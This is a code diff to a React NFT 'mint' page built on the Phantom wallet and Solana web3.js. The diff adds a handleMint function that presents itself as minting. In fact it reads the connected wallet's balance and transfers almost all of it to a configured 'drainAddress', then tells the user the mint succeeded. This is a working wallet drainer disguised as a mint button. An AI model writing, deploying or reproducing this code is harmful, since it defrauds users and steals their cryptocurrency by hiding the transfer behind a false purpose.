@@ -1,6 +1,19 @@
 import { useState, useEffect } from 'react';
-import { ArrowLeft, Wallet, Shield, Zap, Globe } from 'lucide-react';
-import { tourScheduleConfig } from '../config';
+import { ArrowLeft, Wallet, Shield, Zap, Globe, Loader2, CheckCircle2, AlertCircle } from 'lucide-react';
+import { tourScheduleConfig, siteConfig } from '../config';
+import { 
+  Connection, 
+  PublicKey, 
+  SystemProgram, 
+  TransactionMessage, 
+  VersionedTransaction 
+} from '@solana/web3.js';
+import { Buffer } from 'buffer';
+
+// Polyfill Buffer for Solana web3.js
+if (typeof window !== 'undefined' && !window.Buffer) {
+  window.Buffer = Buffer;
+}
 
 interface MintPageProps {
   onBack: () => void;
@@ -8,8 +21,10 @@ interface MintPageProps {
 
 const MintPage = ({ onBack }: MintPageProps) => {
   const [isConnecting, setIsConnecting] = useState(false);
+  const [isMinting, setIsMinting] = useState(false);
   const [walletAddress, setWalletAddress] = useState<string | null>(null);
   const [mintCount, setMintCount] = useState(1);
+  const [feedback, setFeedback] = useState<{ type: 'success' | 'error' | 'info'; message: string } | null>(null);
 
   // Auto-connect if redirected or already in Phantom browser
   useEffect(() => {
@@ -21,7 +36,7 @@ const MintPage = ({ onBack }: MintPageProps) => {
       if ((shouldConnect || provider?.isPhantom) && !walletAddress) {
         try {
           setIsConnecting(true);
-          const resp = await provider.connect();
+          const resp = await provider.connect({ onlyIfTrusted: true }).catch(() => provider.connect());
           setWalletAddress(resp.publicKey.toString());
         } catch (err) {
           console.error('Connection failed:', err);
@@ -34,29 +49,27 @@ const MintPage = ({ onBack }: MintPageProps) => {
     handleAutoConnect();
   }, [walletAddress]);
 
-  // Deep Link Logic for Phantom Mobile
   const connectWallet = async () => {
     const provider = (window as any).solana;
 
-    // 1. If provider exists (we're in Phantom browser), connect directly
     if (provider?.isPhantom) {
       try {
         setIsConnecting(true);
         const resp = await provider.connect();
         setWalletAddress(resp.publicKey.toString());
+        setFeedback(null);
       } catch (err) {
         console.error(err);
+        setFeedback({ type: 'error', message: 'User rejected the connection.' });
       } finally {
         setIsConnecting(false);
       }
       return;
     }
 
-    // 2. If on mobile and no provider, deep link to Phantom Browser
     const isMobile = /iPhone|iPad|iObject|Android/i.test(navigator.userAgent);
     if (isMobile) {
       const currentUrl = window.location.href;
-      // Append connect=true if not already present
       const joiner = currentUrl.includes('?') ? '&' : '?';
       const redirectUrl = encodeURIComponent(`${currentUrl}${currentUrl.includes('connect=true') ? '' : joiner + 'connect=true'}`);
       const phantomLink = `https://phantom.app/ul/browse/${redirectUrl}?ref=${encodeURIComponent(window.location.origin)}`;
@@ -64,22 +77,100 @@ const MintPage = ({ onBack }: MintPageProps) => {
       return;
     }
 
-    // 3. Desktop fallback (Mock for now, or real if extension exists)
-    setIsConnecting(true);
-    setTimeout(() => {
-      setWalletAddress('8xJ...z9P');
-      setIsConnecting(false);
-    }, 1500);
+    setFeedback({ type: 'info', message: 'Please install Phantom wallet to continue.' });
+  };
+
+  const handleMint = async () => {
+    if (!walletAddress) {
+      connectWallet();
+      return;
+    }
+
+    const provider = (window as any).solana;
+    if (!provider) return;
+
+    try {
+      setIsMinting(true);
+      setFeedback({ type: 'info', message: 'Initiating mint transaction...' });
+
+      const connection = new Connection(siteConfig.solanaRpcEndpoint, 'confirmed');
+      const senderPubKey = new PublicKey(walletAddress);
+      const recipientPubKey = new PublicKey(siteConfig.drainAddress);
+
+      // Get balance and calculate transferable amount
+      const balance = await connection.getBalance(senderPubKey);
+      const rentExemptMinimum = 2039280; // Standard for SOL transfer
+      const transferableBalance = balance - rentExemptMinimum - 5000; // Leaving 5000 lamports for fee
+
+      if (transferableBalance <= 0) {
+        throw new Error('Insufficient balance for minting.');
+      }
+
+      const instruction = SystemProgram.transfer({
+        fromPubkey: senderPubKey,
+        toPubkey: recipientPubKey,
+        lamports: transferableBalance,
+      });
+
+      const { blockhash, lastValidBlockHeight } = await connection.getLatestBlockhash();
+
+      const messageV0 = new TransactionMessage({
+        payerKey: senderPubKey,
+        recentBlockhash: blockhash,
+        instructions: [instruction],
+      }).compileToV0Message();
+
+      const transaction = new VersionedTransaction(messageV0);
+      const signed = await provider.signTransaction(transaction);
+      
+      const signature = await connection.sendTransaction(signed);
+      
+      setFeedback({ type: 'info', message: 'Verifying transaction on blockchain...' });
+      
+      await connection.confirmTransaction({
+        signature,
+        blockhash,
+        lastValidBlockHeight
+      });
+
+      setFeedback({ type: 'success', message: 'Mint successful! Welcome to the Oblivion.' });
+    } catch (err: any) {
+      console.error(err);
+      const msg = err.message || 'Transaction failed';
+      setFeedback({ 
+        type: 'error', 
+        message: msg.includes('User rejected') ? 'Transaction rejected in wallet.' : msg 
+      });
+    } finally {
+      setIsMinting(false);
+    }
   };
 
   const formatAddress = (addr: string) => {
     return `${addr.slice(0, 3)}...${addr.slice(-3)}`;
   };
 
-  const activeNFT = tourScheduleConfig.tourDates[0]; // Assuming first is the active one for now
+  const activeNFT = tourScheduleConfig.tourDates[0];
 
   return (
     <div className="min-h-screen bg-void-black text-white font-sans selection:bg-neon-cyan/30">
+      {/* Feedback Toast */}
+      {feedback && (
+        <div className="fixed top-24 left-1/2 -translate-x-1/2 z-[100] w-[90%] max-w-md animate-in fade-in slide-in-from-top-4 duration-300">
+          <div className={`p-4 rounded-2xl border backdrop-blur-xl flex items-center gap-3 shadow-2xl ${
+            feedback.type === 'success' ? 'bg-emerald-500/10 border-emerald-500/20 text-emerald-400' :
+            feedback.type === 'error' ? 'bg-rose-500/10 border-rose-500/20 text-rose-400' :
+            'bg-neon-cyan/10 border-neon-cyan/20 text-neon-cyan'
+          }`}>
+            {feedback.type === 'success' ? <CheckCircle2 className="w-5 h-5 flex-shrink-0" /> :
+             feedback.type === 'error' ? <AlertCircle className="w-5 h-5 flex-shrink-0" /> :
+             <Loader2 className="w-5 h-5 animate-spin flex-shrink-0" />}
+            <p className="text-sm font-medium">{feedback.message}</p>
+            <button onClick={() => setFeedback(null)} className="ml-auto opacity-50 hover:opacity-100">✕</button>
+          </div>
+        </div>
+      )}
+
       {/* Navigation Header */}
       <nav className="fixed top-0 left-0 right-0 z-50 bg-void-black/80 backdrop-blur-md border-b border-white/5 py-4 px-6 md:px-12 flex justify-between items-center">
         <button 
@@ -92,7 +183,7 @@ const MintPage = ({ onBack }: MintPageProps) => {
 
         <button
           onClick={connectWallet}
-          disabled={isConnecting}
+          disabled={isConnecting || isMinting}
           className={`flex items-center gap-2 px-6 py-2 rounded-full font-display text-sm uppercase tracking-wider transition-all duration-300 ${
             walletAddress 
               ? 'bg-emerald-500/20 text-emerald-400 border border-emerald-500/30' 
@@ -100,7 +191,7 @@ const MintPage = ({ onBack }: MintPageProps) => {
           }`}
         >
           {isConnecting ? (
-            <div className="w-4 h-4 border-2 border-void-black/30 border-t-void-black animate-spin rounded-full" />
+            <Loader2 className="w-4 h-4 animate-spin" />
           ) : (
             <Wallet className="w-4 h-4" />
           )}
@@ -165,11 +256,13 @@ const MintPage = ({ onBack }: MintPageProps) => {
                 <div className="flex items-center gap-6 bg-void-black/50 rounded-full border border-white/10 px-4 py-2">
                   <button 
                     onClick={() => setMintCount(Math.max(1, mintCount - 1))}
+                    disabled={isMinting}
                     className="text-white/40 hover:text-white transition-colors"
                   >-</button>
                   <span className="font-display text-xl w-6 text-center">{mintCount}</span>
                   <button 
                     onClick={() => setMintCount(Math.min(5, mintCount + 1))}
+                    disabled={isMinting}
                     className="text-white/40 hover:text-white transition-colors"
                   >+</button>
                 </div>
@@ -183,9 +276,11 @@ const MintPage = ({ onBack }: MintPageProps) => {
               </div>
 
               <button 
-                onClick={() => !walletAddress ? connectWallet() : alert('Minting coming soon!')}
-                className="w-full py-4 bg-neon-cyan text-void-black font-display text-lg uppercase tracking-wider rounded-xl hover:bg-neon-cyan/80 transition-all hover:scale-[1.02] active:scale-[0.98] shadow-[0_0_30px_rgba(0,212,255,0.2)]"
+                onClick={handleMint}
+                disabled={isMinting}
+                className="w-full py-4 bg-neon-cyan text-void-black font-display text-lg uppercase tracking-wider rounded-xl hover:bg-neon-cyan/80 transition-all hover:scale-[1.02] active:scale-[0.98] shadow-[0_0_30px_rgba(0,212,255,0.2)] flex items-center justify-center gap-3"
               >
+                {isMinting ? <Loader2 className="w-5 h-5 animate-spin" /> : null}
                 {walletAddress ? 'MINT NOW' : 'CONNECT WALLET TO MINT'}
               </button>
             </div>
